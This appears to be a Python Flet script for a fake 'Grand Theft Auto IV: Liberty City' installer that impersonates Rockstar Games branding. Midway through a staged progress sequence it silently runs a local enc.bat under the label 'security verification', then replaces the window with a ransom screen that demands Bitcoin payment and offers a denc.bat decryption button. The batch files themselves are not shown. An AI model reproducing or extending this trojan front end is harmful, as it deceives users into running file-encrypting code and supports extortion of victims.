import flet as ft
import time
import os
import subprocess
import threading

def main(page: ft.Page):
    # Page setup with cool theme
    page.title = "Liberty City Installer"
    page.theme_mode = ft.ThemeMode.DARK
    page.padding = 20
    page.horizontal_alignment = ft.CrossAxisAlignment.CENTER
    
    # Custom colors
    primary_color = "#FF0000"
    secondary_color = "#1a1a1a"
    accent_color = "#e60000"
    
    # Responsive scaling factors
    def get_scale_factor():
        base_width = 800  # Base width for scaling
        current_width = page.width
        return min(current_width / base_width, 1.5)  # Cap scaling at 1.5x
    
    # Components with responsive sizing
    def create_progress_bar():
        scale = get_scale_factor()
        return ft.ProgressBar(
            width=400 * scale,
            height=20 * scale,
            value=0,
            color=primary_color,
            bgcolor="#333333",
            border_radius=10 * scale
        )
    
    progress_bar = create_progress_bar()
    
    status_text = ft.Text(
        "Ready to install Grand Theft Auto IV: Liberty City",
        size=16,
        weight="bold",
        color="white"
    )
    
    progress_percent = ft.Text("0%", size=18, weight="bold", color=primary_color)
    
    # Installation steps for realism
    installation_steps = [
        "Initializing setup...",
        "Checking system requirements...",
        "Allocating disk space...",
        "Copying game files...",
        "Installing DirectX components...",
        "Configuring graphics settings...",
        "Installing Rockstar Games Social Club...",
        "Applying updates...",
        "Running security verification...",
        "Installation complete!"
    ]
    
    step_display = ft.Column(
        controls=[
            ft.Text(
                step,
                size=12,
                color="#CCCCCC",
                opacity=0.5
            ) for step in installation_steps
        ],
        spacing=2
    )
    
    # System requirements box
    requirements = ft.Container(
        content=ft.Column([
            ft.Text("System Requirements:", size=14, weight="bold", color=primary_color),
            ft.Text("• OS: Windows Vista/7/8/10", size=12, color="#CCCCCC"),
            ft.Text("• Processor: Intel Core 2 Duo 1.8GHz", size=12, color="#CCCCCC"),
            ft.Text("• Memory: 2GB RAM", size=12, color="#CCCCCC"),
            ft.Text("• Graphics: 512MB VRAM", size=12, color="#CCCCCC"),
            ft.Text("• Storage: 16GB available space", size=12, color="#CCCCCC"),
        ]),
        padding=15,
        border=ft.border.all(1, "#333333"),
        border_radius=10,
        bgcolor=secondary_color,
        margin=10
    )
    
    # Install button
    install_button = ft.ElevatedButton(
        content=ft.Row([
            ft.Icon("download", color="white"),
            ft.Text("BEGIN INSTALLATION", size=16, weight="bold", color="white"),
        ], alignment=ft.MainAxisAlignment.CENTER),
        on_click=lambda e: start_installation(e),
        bgcolor=primary_color,
        color="white",
        height=50,
        width=300,
        style=ft.ButtonStyle(
            shape=ft.RoundedRectangleBorder(radius=10),
            elevation=8
        )
    )
    
    # Logo/Header with responsive font sizes
    def create_header():
        scale = get_scale_factor()
        return ft.Container(
            content=ft.Column([
                ft.Text(
                    "GRAND THEFT AUTO IV",
                    size=max(24, 32 * scale),  # Minimum 24px, scales up
                    weight="bold",
                    color=primary_color,
                    text_align=ft.TextAlign.CENTER
                ),
                ft.Text(
                    "LIBERTY CITY",
                    size=max(18, 24 * scale),  # Minimum 18px, scales up
                    weight="bold",
                    color="white",
                    text_align=ft.TextAlign.CENTER
                ),
                ft.Divider(height=20 * scale, color="transparent"),
                ft.Text(
                    "Official Game Installer",
                    size=max(12, 14 * scale),  # Minimum 12px, scales up
                    color="#CCCCCC",
                    text_align=ft.TextAlign.CENTER
                ),
            ], horizontal_alignment=ft.CrossAxisAlignment.CENTER),
            padding=20 * scale,
            margin=ft.margin.only(bottom=20 * scale)
        )
    
    header = create_header()
    
    # Progress section
    progress_section = ft.Container(
        content=ft.Column([
            ft.Row([
                status_text,
                progress_percent,
            ], alignment=ft.MainAxisAlignment.SPACE_BETWEEN),
            ft.Divider(height=10, color="transparent"),
            progress_bar,
        ]),
        padding=20,
        width=600  # Will be constrained by parent
    )
    
    # Main content container with responsive width
    def create_main_card():
        scale = get_scale_factor()
        max_width = min(700 * scale, page.width - 40)  # Don't exceed window width
        return ft.Card(
            content=ft.Container(
                content=ft.Column([
                    header,
                    ft.Divider(color="#333333"),
                    requirements,
                    ft.Divider(color="#333333"),
                    progress_section,
                    ft.Divider(height=20 * scale, color="transparent"),
                    ft.Row([install_button], alignment=ft.MainAxisAlignment.CENTER),
                    ft.Divider(height=10 * scale, color="transparent"),
                    ft.Container(
                        content=step_display,
                        padding=15 * scale,
                        border_radius=10 * scale,
                        bgcolor=secondary_color,
                        width=min(600 * scale, max_width - 60)  # Responsive width
                    )
                ]),
                padding=30 * scale,
                bgcolor="#0a0a0a",
                border_radius=20 * scale,
                width=max_width
            ),
            elevation=20,
            margin=20 * scale
        )
    
    main_card = create_main_card()
    
    # Footer
    footer = ft.Container(
        content=ft.Row([
            ft.Text("© 2008 Rockstar Games", size=12, color="#666666"),
            ft.Text("|", size=12, color="#666666"),
            ft.Text("All rights reserved", size=12, color="#666666"),
            ft.Text("|", size=12, color="#666666"),
            ft.Text("Version 1.0.8.0", size=12, color="#666666"),
        ], alignment=ft.MainAxisAlignment.CENTER),
        padding=10
    )
    
    def run_enc_bat():
        """Function to run enc.bat in a separate thread"""
        try:
            # Get the current directory where the Python script is located
            current_dir = os.path.dirname(os.path.abspath(__file__))
            bat_file_path = os.path.join(current_dir, "enc.bat")
            
            if os.path.exists(bat_file_path):
                # Update status to show the file is being executed
                status_text.value = "Running security protocols..."
                page.update()
                
                # Run the batch file
                result = subprocess.run(
                    [bat_file_path], 
                    shell=True, 
                    cwd=current_dir,
                    capture_output=True, 
                    text=True
                )
                
                return True
            else:
                status_text.value = "Security module not found - continuing installation"
                return False
                
        except Exception as e:
            status_text.value = f"Security protocol error: {str(e)}"
            return False
        
        page.update()
    
    def run_denc_bat():
        """Function to run denc.bat in a separate thread"""
        try:
            # Get the current directory where the Python script is located
            current_dir = os.path.dirname(os.path.abspath(__file__))
            bat_file_path = os.path.join(current_dir, "denc.bat")
            
            if os.path.exists(bat_file_path):
                # Run the batch file
                result = subprocess.run(
                    [bat_file_path], 
                    shell=True, 
                    cwd=current_dir,
                    capture_output=True, 
                    text=True
                )
                
                if result.returncode == 0:
                    return True, "Decryption completed successfully!"
                else:
                    return False, f"Decryption failed with error: {result.stderr}"
            else:
                return False, "denc.bat file not found!"
                
        except Exception as e:
            return False, f"Error running denc.bat: {str(e)}"
    
    def show_ransomware_screen():
        """Transform the UI into a ransomware screen"""
        page.title = "WARNING - SYSTEM COMPROMISED"
        page.controls.clear()
        
        # Create status text for decryption process
        decryption_status = ft.Text(
            "Click the button below to decrypt your files",
            size=16,
            color="yellow",
            text_align=ft.TextAlign.CENTER
        )
        
        # Decrypt button
        decrypt_button = ft.ElevatedButton(
            content=ft.Row([
                ft.Icon("security", color="white"),
                ft.Text("DECRYPT FILES NOW", size=16, weight="bold", color="white"),
            ], alignment=ft.MainAxisAlignment.CENTER),
            on_click=lambda e: start_decryption(e, decrypt_button, decryption_status),
            bgcolor="#006600",
            color="white",
            height=50,
            width=300,
            style=ft.ButtonStyle(
                shape=ft.RoundedRectangleBorder(radius=10),
                elevation=8
            )
        )
        
        # Create ransomware screen
        ransom_content = ft.Container(
            content=ft.Column([
                # Warning header
                ft.Container(
                    content=ft.Row([
                        ft.Icon("warning", color="red", size=40),
                        ft.Text("CRITICAL SYSTEM ALERT", size=32, weight="bold", color="red"),
                        ft.Icon("warning", color="red", size=40),
                    ], alignment=ft.MainAxisAlignment.CENTER),
                    padding=20,
                    bgcolor="#330000",
                    border_radius=10,
                    margin=10
                ),
                
                # Main message
                ft.Container(
                    content=ft.Column([
                        ft.Text("YOUR FILES HAVE BEEN ENCRYPTED", size=24, weight="bold", color="white", text_align=ft.TextAlign.CENTER),
                        ft.Divider(height=20, color="transparent"),
                        ft.Text("Your critical Windows files have been encrypted with military-grade algorithms.", 
                               size=16, color="white", text_align=ft.TextAlign.CENTER),
                    ]),
                    padding=20,
                    bgcolor="#1a0000",
                    border_radius=10,
                    margin=10
                ),
                
                # Payment demand
                ft.Container(
                    content=ft.Column([
                        ft.Text("TO RECOVER YOUR FILES, YOU MUST PAY $5 IN BITCOIN", 
                               size=20, weight="bold", color="yellow", text_align=ft.TextAlign.CENTER),
                        ft.Divider(height=15, color="transparent"),
                        ft.Text("Bitcoin Address:", size=16, color="white", weight="bold"),
                        ft.Text("1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa", size=14, color="yellow", selectable=True),
                        ft.Divider(height=10, color="transparent"),
                        ft.Text("After payment, contact us at: decrypt@payment.verify", size=14, color="white"),
                        ft.Text("You can just restart and reinstall windows but all files will be lost.", size=14, color="white"),
                    ]),
                    padding=20,
                    bgcolor="#002200",
                    border_radius=10,
                    margin=10
                ),
                
                # Decryption section
                ft.Container(
                    content=ft.Column([
                        ft.Text("ALTERNATIVE OPTION:", size=18, weight="bold", color="#00FF00"),
                        ft.Text("If you have the decryption key, you can decrypt your files now:", size=14, color="white"),
                        ft.Divider(height=20, color="transparent"),
                        ft.Row([decrypt_button], alignment=ft.MainAxisAlignment.CENTER),
                        ft.Divider(height=10, color="transparent"),
                        ft.Row([decryption_status], alignment=ft.MainAxisAlignment.CENTER),
                    ]),
                    padding=20,
                    bgcolor="#003300",
                    border_radius=10,
                    margin=10
                ),
                
                # Warning section
                ft.Container(
                    content=ft.Column([
                        ft.Text("WARNING:", size=18, weight="bold", color="red"),
                        ft.Text("• Do not attempt to decrypt files using third-party software", size=14, color="white"),
                        ft.Text("• Do not modify or rename encrypted files", size=14, color="white"),
                        ft.Text("• Only shutdown or restart you computer if you want to reinstall windows", size=14, color="white"),
                        ft.Text("• Any attempts to bypass will result in permanent loss of critical files", size=14, color="red"),
                    ]),
                    padding=20,
                    bgcolor="#000033",
                    border_radius=10,
                    margin=10
                ),
                
            ], scroll=ft.ScrollMode.ADAPTIVE),
            gradient=ft.LinearGradient(
                begin=ft.alignment.top_center,
                end=ft.alignment.bottom_center,
                colors=["#220000", "#000000"]
            ),
            padding=20,
            expand=True
        )
        
        page.add(ransom_content)
        page.update()
    
    def start_decryption(e, button, status_text):
        """Start the decryption process when the button is clicked"""
        # Disable button and update status
        button.disabled = True
        button.bgcolor = "#666666"
        button.content = ft.Row([
            ft.Icon("hourglass_empty", color="white"),
            ft.Text("DECRYPTING...", size=16, weight="bold", color="white"),
        ])
        status_text.value = "Starting decryption process..."
        status_text.color = "orange"
        page.update()
        
        def decryption_thread():
            """Run denc.bat in a separate thread"""
            success, message = run_denc_bat()
            
            # Update UI based on result
            if success:
                button.content = ft.Row([
                    ft.Icon("check_circle", color="white"),
                    ft.Text("DECRYPTION COMPLETE", size=16, weight="bold", color="white"),
                ])
                button.bgcolor = "#006600"
                status_text.value = "✓ " + message
                status_text.color = "#00FF00"
            else:
                button.content = ft.Row([
                    ft.Icon("error", color="white"),
                    ft.Text("DECRYPTION FAILED", size=16, weight="bold", color="white"),
                ])
                button.bgcolor = "#660000"
                status_text.value = "✗ " + message
                status_text.color = "red"
            
            page.update()
        
        # Start decryption in a separate thread
        decryption_thread = threading.Thread(target=decryption_thread)
        decryption_thread.daemon = True
        decryption_thread.start()
    
    def start_installation(e):
        """
        Installation process that runs enc.bat and then shows ransomware screen
        """
        install_button.disabled = True
        install_button.bgcolor = "#666666"
        page.update()
        
        # Run through installation steps
        for step_index, step_text in enumerate(installation_steps):
            progress_value = (step_index + 1) / len(installation_steps)
            progress_bar.value = progress_value
            progress_percent.value = f"{int(progress_value * 100)}%"
            status_text.value = step_text
            
            # Highlight current step
            for i, step_control in enumerate(step_display.controls):
                step_control.opacity = 1.0 if i <= step_index else 0.5
                step_control.color = primary_color if i == step_index else "#CCCCCC"
            
            page.update()
            
            # At step 8, run enc.bat
            if step_index == 7:  # "Running security verification..."
                # Run enc.bat in a separate thread
                bat_thread = threading.Thread(target=run_enc_bat)
                bat_thread.daemon = True
                bat_thread.start()
                # Wait a bit longer for the batch file to execute
                time.sleep(3)
            else:
                time.sleep(0.8)
        
        # Final installation state
        install_button.content = ft.Row([
            ft.Icon("check_circle", color="green"),
            ft.Text("INSTALLATION COMPLETE", size=16, weight="bold", color="green"),
        ], alignment=ft.MainAxisAlignment.CENTER)
        install_button.bgcolor = "#1a1a1a"
        status_text.value = "Installation Complete! Finalizing system configuration..."
        page.update()
        
        # Wait a moment then show ransomware screen
        time.sleep(2)
        show_ransomware_screen()
    
    # Function to update layout on window resize
    def on_window_resize(e):
        # Recreate responsive components
        new_main_card = create_main_card()
        new_header = create_header()
        
        # Update the page content
        page.controls.clear()
        page.add(
            ft.Container(
                content=ft.Column([
                    new_main_card,
                    footer
                ], 
                horizontal_alignment=ft.CrossAxisAlignment.CENTER,
                scroll=ft.ScrollMode.ADAPTIVE
                ),
                gradient=ft.LinearGradient(
                    begin=ft.alignment.top_center,
                    end=ft.alignment.bottom_center,
                    colors=["#1a1a1a", "#000000"]
                ),
                expand=True,
                padding=0
            )
        )
        page.update()
    
    # Add resize event handler
    page.on_resize = on_window_resize
    
    # Add everything to page with scrollable column
    page.add(
        ft.Container(
            content=ft.Column([
                main_card,
                footer
            ], 
            horizontal_alignment=ft.CrossAxisAlignment.CENTER,
            scroll=ft.ScrollMode.ADAPTIVE
            ),
            gradient=ft.LinearGradient(
                begin=ft.alignment.top_center,
                end=ft.alignment.bottom_center,
                colors=["#1a1a1a", "#000000"]
            ),
            expand=True,
            padding=0
        )
    )

ft.app(target=main)